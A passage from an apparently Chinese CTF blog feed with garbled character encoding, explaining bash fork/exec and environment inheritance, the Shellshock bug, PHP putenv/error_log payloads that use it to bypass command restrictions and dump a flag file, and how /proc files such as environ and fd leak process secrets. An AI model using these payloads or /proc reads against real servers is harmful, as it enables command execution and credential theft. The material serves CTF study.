ˆæ®µã€‚forkè°ƒç”¨åœ¨çˆ¶è¿›ç¨‹ä¸­è¿”å›æ–°åˆ›å»ºçš„å­è¿›ç¨‹çš„è¿›ç¨‹IDï¼Œåœ¨å­è¿›ç¨‹ä¸­è¿”å›0ã€‚<br><br><br>2.å­è¿›ç¨‹çš„ç¯å¢ƒï¼šå°½ç®¡å­è¿›ç¨‹å¤åˆ¶äº†çˆ¶è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œæ‹¥æœ‰è‡ªå·±çš„è¿›ç¨‹IDï¼Œå¹¶ä¸”å…¶æ‰§è¡Œè·¯å¾„å¯ä»¥ä¸çˆ¶è¿›ç¨‹ä¸åŒã€‚<br><br><br>3.execè°ƒç”¨ï¼šåœ¨å­è¿›ç¨‹ä¸­ï¼Œé€šå¸¸ä¼šéšåè°ƒç”¨execç³»åˆ—å‡½æ•°ä¹‹ä¸€æ¥æ‰§è¡Œä¸€ä¸ªæ–°çš„ç¨‹åºã€‚execå‡½æ•°ä¼šæ›¿æ¢å½“å‰è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µå’Œæ•°æ®æ®µï¼Œç”¨æ–°ç¨‹åºçš„å†…å®¹æ¥æ›¿æ¢ã€‚è¿™æ„å‘³ç€å­è¿›ç¨‹å°†åœæ­¢æ‰§è¡ŒåŸå…ˆç»§æ‰¿è‡ªçˆ¶è¿›ç¨‹çš„ç¨‹åºï¼Œå¼€å§‹æ‰§è¡ŒexecæŒ‡å®šçš„æ–°ç¨‹åºã€‚ä»ç”¨æˆ·çš„è§’åº¦çœ‹ï¼Œå­è¿›ç¨‹ä¼¼ä¹å˜æˆäº†ä¸€ä¸ªå…¨æ–°çš„ç¨‹åºã€‚<br><br><br>4.çˆ¶è¿›ç¨‹çš„è¡Œä¸ºï¼šåœ¨forkä¹‹åï¼Œçˆ¶è¿›ç¨‹å¯ä»¥é€‰æ‹©ç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼Œæˆ–è€…ç»§ç»­æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚å¦‚æœçˆ¶è¿›ç¨‹é€‰æ‹©ç­‰å¾…ï¼Œå®ƒå¯ä»¥ä½¿ç”¨waitæˆ–waitpidç³»ç»Ÿè°ƒç”¨æ¥è·å–å­è¿›ç¨‹çš„ç»ˆæ­¢çŠ¶æ€ã€‚<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæœºåˆ¶å¯ä»¥è®©bashåœ¨ä¸ç»ˆæ­¢å½“å‰ä¼šè¯çš„æƒ…å†µä¸‹ï¼Œå¯åŠ¨å’Œç®¡ç†å¤šä¸ªä»»åŠ¡ï¼Œä¾‹å¦‚åœ¨è¿è¡Œä¸€ä¸ªå¤–éƒ¨è„šæœ¬çš„æ—¶å€™ï¼Œbashå°±ä¼šä½¿ç”¨forkå’Œexecæ¥åˆ›å»ºä¸€ä¸ªè¿è¡Œè¯¥å‘½ä»¤çš„å­è¿›ç¨‹ï¼Œè€Œbashè‡ªèº«åˆ™ç»§ç»­ç­‰å¾…ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¾“å…¥ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo &quot;çˆ¶è¿›ç¨‹çš„PIDï¼š$$&quot;<br>bash -c &#x27;echo &quot;å­è¿›ç¨‹çš„PIDï¼š$$&quot;&#x27;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151504967.png" alt="image-20240318234637280"></p><p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä¸‹é¢å‡ ä¸ªå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹æƒ…å†µ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ps -f #æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„çŠ¶æ€ï¼Œ-fè¡¨ç¤ºå…¨æ ¼å¼ï¼Œå¯ä»¥æ˜¾ç¤ºå‡ºçˆ¶è¿›ç¨‹çš„ID(PPID)<br>pstree -p #ä»¥æ ‘çŠ¶å›¾çš„å½¢å¼æ˜¾ç¤ºè¿›ç¨‹åŠå…¶å­è¿›ç¨‹ï¼Œ-pé€‰é¡¹å¯ä»¥æ˜¾ç¤ºè¿›ç¨‹çš„PID<br>cat /proc/PID/status #è¾“å…¥æƒ³è¦çœ‹çš„è¿›ç¨‹PIDï¼Œå¯ä»¥çŸ¥é“è¿›ç¨‹çš„å„ç§è¯¦ç»†æƒ…å†µ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439654.png" alt="image-20240318235046836"></p><p>ä¸‹é¢æ˜¯ä¼šå¯åŠ¨å­è¿›ç¨‹çš„å‡ ç§æ–¹å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.åå°ä½œä¸šï¼šä½¿ç”¨&amp;å°†å‘½ä»¤æ”¾å…¥åå°æ‰§è¡Œï¼Œä¾‹å¦‚command &amp;ã€‚<br>2.ç®¡é“ï¼šä½¿ç”¨|å°†å¤šä¸ªå‘½ä»¤è¿æ¥èµ·æ¥ï¼Œæ¯ä¸ªå‘½ä»¤éƒ½ä¼šåœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œä¾‹å¦‚command1 | command2ã€‚<br>3.æ‹¬å·å‘½ä»¤åˆ—è¡¨ï¼šä½¿ç”¨()å°†å‘½ä»¤åŒ…å›´èµ·æ¥ï¼Œè¿™äº›å‘½ä»¤ä¼šåœ¨å­shellä¸­æ‰§è¡Œï¼Œä¾‹å¦‚(cmd1; cmd2; cmd3)ã€‚<br>4.æ‰§è¡Œå¤–éƒ¨è„šæœ¬æˆ–ç¨‹åºï¼šç›´æ¥è¿è¡Œä¸€ä¸ªè„šæœ¬æˆ–ç¨‹åºï¼Œå¦‚bash ./test.shã€‚<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(echo $BASH_SUBSHELL)  #BASH_SUBSHELLè¿™ä¸ªå˜é‡èƒ½æ˜¾ç¤ºå½“å‰shellçš„åµŒå¥—æ·±åº¦<br><span class="hljs-meta prompt_">$</span><span class="language-bash">BASH_SUBSHELL</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504968.png" alt="image-20240319000940380"></p><p><strong>ç¯å¢ƒå˜é‡å’Œbash</strong></p><p>åœ¨bashä¸­ï¼Œå­è¿›ç¨‹æ˜¯ä¸èƒ½ç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ™®é€šå˜é‡æˆ–å‡½æ•°å˜é‡çš„ï¼Œä½†æ˜¯å¯ä»¥ç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ™®é€šç¯å¢ƒå˜é‡å’Œå‡½æ•°ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# gu=&quot;hacker&quot;<br><br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# echo $gu<br>hacker<br><br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# bash<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# echo $gu<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504969.png" alt="image-20240321084451562"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# export gu<br><br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# bash<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# echo $gu<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439657.png" alt="image-20240321084631286"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# hack() &#123; echo &quot;hacker&quot;; &#125;<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# hack<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# bash<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# hack<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504970.png" alt="image-20240321084802497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# export -f hack<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# bash<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# hack<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439659.png" alt="image-20240321084851281"></p><p>ä¸‹é¢å°±æ˜¯æœ‰æ¼æ´ç‚¹çš„åœ°æ–¹äº†ï¼Œä½†æ˜¯è¦åœ¨bash&lt;&#x3D;4.3ç‰ˆæœ¬æ‰æœ‰è¯¥æ¼æ´</p><p>å…ˆæ¥å±•ç¤ºä¸€ä¸‹æ²¡æœ‰æ¼æ´çš„æƒ…å†µ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# test=&#x27;() &#123; echo &quot;this is a bug&quot;; &#125;&#x27;<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# test<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# echo $test<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# export -f test<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# export test<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# bash<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# test<br>â”Œâ”€â”€(rootã‰¿DESKTOP-6T61DMR)-[~/tmp]<br>â””â”€# echo $test<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439660.png" alt="image-20240321085418028"></p><p>æœ‰æ¼æ´çš„æƒ…å†µå°±æ˜¯åœ¨å­è¿›ç¨‹ä¸­ç›´æ¥è¾“å…¥testä¼šè¢«å½“ä½œå‡½æ•°æ¥æ‰§è¡Œï¼Œæ¯”å¦‚æ–‡ç« ä¸­çš„è¿™æ ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;&#x27;<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10<br>bash: export: ailx10: not a function<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash<br>[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10<br>ailx10 is a hacker<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥æœ‰è¿™ç§æ–¹å¼ï¼Œåˆ©ç”¨() { :; };&#x2F;bin&#x2F;ls</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123; :; &#125;;/bin/ls&#x27;<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash<br>curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt<br>curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit<br>exit<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$<br></code></pre></td></tr></table></figure><p><strong>ç»¼ä¸Šæ‰€è¿°è§¦å‘bashæ¼æ´å¯ä»¥å½’çº³å¦‚ä¸‹</strong></p><ol><li>äº§ç”Ÿæ–°çš„bash</li><li>é€šè¿‡ç¯å¢ƒå˜é‡ä¼ é€’</li><li>ç¯å¢ƒå˜é‡ä»¥<code>() &#123;&#125;</code>è¿™æ ·çš„å½¢å¼</li></ol><p><strong>å¯ä»¥ç”¨ä¸‹é¢çš„ä¸€æ¡è¯­å¥æ¥éªŒè¯æ˜¯å¦æœ‰shellshockæ¼æ´</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;<br></code></pre></td></tr></table></figure><p>ä¸å­˜åœ¨çš„æƒ…å†µï¼š</p><p><img src="http://cdn.clown2024.cn/202407151504971.png" alt="image-20240321090254063"></p><p>å­˜åœ¨çš„æƒ…å†µï¼š</p><p><img src="http://cdn.clown2024.cn/202407151504972.png" alt="image-20240321090319060"></p><blockquote><p>:åœ¨è¿™é‡Œå°±ç›¸å½“äºtrue</p><p><code>env</code>å¯ä»¥åˆ›å»ºä¸´æ—¶ç¯å¢ƒå˜é‡</p><p><code>bash -c</code>å¯ä»¥è¿è¡Œä¸€ä¸ªshellå‘½ä»¤</p><p>å¯¹äºå­˜åœ¨shellshockæ¼æ´çš„ç¯å¢ƒä¸‹ï¼ŒBashå¯¹äºç¯å¢ƒå˜é‡åªæ˜¯æ£€æµ‹åˆ°å‡½æ•°ï¼Œå¹¶ä¸”ä»â€™{â€˜å¼€å§‹æ‰§è¡Œï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åœ¨â€™}â€™ååœæ­¢ï¼Œä¹Ÿå°±æ˜¯è¯´å®šä¹‰åœ¨å‡½æ•°ä½“å¤–shellå‘½ä»¤ä¹Ÿä¼šæ‰§è¡Œã€‚</p></blockquote><p>é‚£ç°åœ¨çœ‹å›è¿™é¢˜</p><p>åŒæ ·èšå‰‘è¿ä¸Šä¹‹åæ‰§è¡Œä¸äº†å‘½ä»¤</p><p><img src="http://cdn.clown2024.cn/202407151504973.png" alt="image-20240321140952793"></p><p>è¿™é¢˜è¯´æ˜¯åˆ©ç”¨åˆ°äº†shellshockæ¼æ´ï¼Œé‚£å°±è¦æ»¡è¶³ä¸Šé¢ä¸‰ä¸ªæ¡ä»¶ï¼Œè¿™é‡Œæ˜¯åˆ©ç”¨äº†æ‰§è¡Œerror_logå‡½æ•°æ—¶ä¼šæ‰§è¡Œsh -c -t -iï¼Œè¿™é‡Œè¿˜éœ€è¦sh é»˜è®¤çš„ shell æ˜¯ bashï¼Œç„¶åå°±ä¼šå¼€å¯ä¸€ä¸ªæ–°çš„bashç¯å¢ƒæ‰€ä»¥å¦‚æœå­˜åœ¨æ¼æ´å³å¯è§¦å‘ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªerror_logç„¶åå»è·Ÿè¸ªè°ƒç”¨çœ‹ä¸€ä¸‹ </p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504974.png" alt="image-20240321142333751"></p><p>é‚£ä¹ˆå°±å¯ä»¥åŒæ ·åˆ©ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•ï¼Œç”¨putenvæ¥å†™ä¸€ä¸ªphpæ–‡ä»¶ç„¶åä¸Šä¼ è§¦å‘</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;hack=() &#123; :; &#125;;cat /flag &gt;&gt; /var/www/html/flag.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439665.png" alt="image-20240321142626262"></p><p>emmmå¾ˆæ€ªå•Šæ”¶ä¸åˆ°flag</p><p>éš¾ç»·åæ¥æ‰¾åˆ°é—®é¢˜ï¼Œç¯å¢ƒå˜é‡ä¸€å®šè¦æœ‰PHP_å‰ç¼€æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆå¾ˆå¥‡æ€ªï¼Œæ­£ç¡®payloadå¦‚ä¸‹ï¼Œè¿™é‡Œflagä¸èƒ½ç›´æ¥è¯»è¦ç”¨&#x2F;readflagï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_hack=() &#123; :; &#125;; /read &gt;&gt; /var/www/html/flag2.txt&quot;</span>); <br>   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504975.png" alt="image-20240321145724033"></p><h1 id="apache-mod-cgi"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/xia739635297/article/details/104764329">https://blog.csdn.net/xia739635297/article/details/104764329</a></p><p>CGIç®€å•è¯´æ¥ä¾¿æ˜¯æ”¾åœ¨æœåŠ¡å™¨ä¸Šçš„å¯æ‰§è¡Œç¨‹åº,CGIç¼–ç¨‹æ²¡æœ‰ç‰¹å®šçš„è¯­è¨€,Cè¯­è¨€,linux shell,perl,vbç­‰ç­‰éƒ½å¯ä»¥è¿›è¡ŒCGIç¼–ç¨‹ã€‚</p><p>ä½¿ç”¨linux shellè„šæœ¬ç¼–å†™çš„cgiç¨‹åºä¾¿å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>procç›®å½•ä½œç”¨æ€»ç»“</title>
      <link href="/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/241148">Proc ç›®å½•åœ¨ CTF ä¸­çš„åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h1 id="x2fprocç›®å½•æ˜¯ä»€ä¹ˆ"><a href="#procç›®å½•æ˜¯ä»€ä¹ˆ" class="headerlink" title="&#x2F;procç›®å½•æ˜¯ä»€ä¹ˆ"></a>&#x2F;procç›®å½•æ˜¯ä»€ä¹ˆ</h1><p>Linuxç³»ç»Ÿä¸Šçš„&#x2F;procç›®å½•æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå³procæ–‡ä»¶ç³»ç»Ÿã€‚ä¸å…¶å®ƒå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯ï¼Œ&#x2F;procæ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚</p><p>è¿™é‡Œçœ‹ä¸€ä¸‹&#x2F;procç›®å½•ä¸‹æœ‰ä»€ä¹ˆ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443720.png" alt="image-20240310230848618"></p><p>ç›®å½•ä¸­åŒ…å«è®¸å¤šä»¥æ•°å­—å‘½åçš„å­ç›®å½•ï¼Œè¿™äº›æ•°å­—è¡¨ç¤ºç³»ç»Ÿå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„è¿›ç¨‹å·(PID)ï¼Œé‡Œé¢åŒ…å«å¯¹åº”è¿›ç¨‹ç›¸å…³çš„å¤šä¸ªä¿¡æ¯æ–‡ä»¶ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151443721.png" alt="image-20240310231053017"></p><p>è¿›ç¨‹å·ä¸º1çš„æ–‡ä»¶é‡Œæœ‰è¿™äº›æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰äº›æ–‡ä»¶æ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæœ‰çš„ï¼Œctfä¸­æˆ‘ä»¬éœ€è¦çš„å°±æ˜¯åˆ©ç”¨è¿™äº›é€šç”¨çš„æ–‡ä»¶æ¥è·å–ä¸€äº›è¿›ç¨‹ä¸­çš„ç›¸å…³ä¿¡æ¯ã€‚</p><h1 id="x2fprocç›®å½•ä½œç”¨"><a href="#procç›®å½•ä½œç”¨" class="headerlink" title="&#x2F;procç›®å½•ä½œç”¨"></a>&#x2F;procç›®å½•ä½œç”¨</h1><p><strong>&#x2F;proc&#x2F;self</strong>æŒ‡å‘çš„å°±æ˜¯å½“å‰è¿›ç¨‹å·çš„ç›®å½•ï¼Œè¿™ä¸ªä¼šç»å¸¸ç”¨åˆ°ï¼Œå› ä¸ºæ¯”å¦‚é¶æœºå¯åŠ¨çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªè‡ªå·±çš„è¿›ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥é€šè¿‡&#x2F;proc&#x2F;selfæ¥è·å–å½“å‰çš„è¿›ç¨‹å·ï¼Œè¿›è€Œè·å–æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚</p><h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p>cmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443722.png" alt="image-20240310231615078"></p><p>æ¯”å¦‚ç›®æ ‡å¯åŠ¨äº†ä¸€ä¸ªwebæœåŠ¡çš„æ—¶å€™ï¼Œæ¯”å¦‚<strong>python .&#x2F;app.py</strong>ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡cat &#x2F;proc&#x2F;self&#x2F;cmdlineæ¥è·å¾—è¿™ä¸ªå¯åŠ¨å‘½ä»¤äº†ã€‚</p><h2 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h2><p>cwd æ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cwdæ–‡ä»¶è·å–ç›®æ ‡æŒ‡å®šè¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls /proc/117/cwd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443723.png" alt="image-20240310231940043"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/7163/cwd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443724.png" alt="image-20240310232042034"></p><h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>exe æ˜¯ä¸€ä¸ªæŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå®Œæ•´è·¯å¾„ï¼‰çš„ç¬¦å·é“¾æ¥ã€‚é€šè¿‡exeæ–‡ä»¶æˆ‘ä»¬å¯ä»¥è·å¾—æŒ‡å®šè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/exe<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443725.png" alt="image-20240310232728115"></p><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p>environ æ–‡ä»¶å­˜å‚¨ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ã€‚å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹environç›®å½•æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/environ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443726.png" alt="image-20240310232953047"></p><p>æœ‰æ—¶å€™secret_keyä¼šæ”¾åœ¨ç¯å¢ƒå˜é‡æˆ‘ä»¬å°±å¯ä»¥å»è¯»å–</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>fd æ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢åŒ…å«è¿™å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•é‡Œçš„æ–‡ä»¶è·å¾—æŒ‡å®šè¿›ç¨‹æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/fd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443728.png" alt="image-20240310233433456"></p><p>ç„¶åæƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶å¯ä»¥å»catå¯¹åº”çš„æè¿°ç¬¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/fd/7<br></code></pre></td></tr></table></figure><p><img 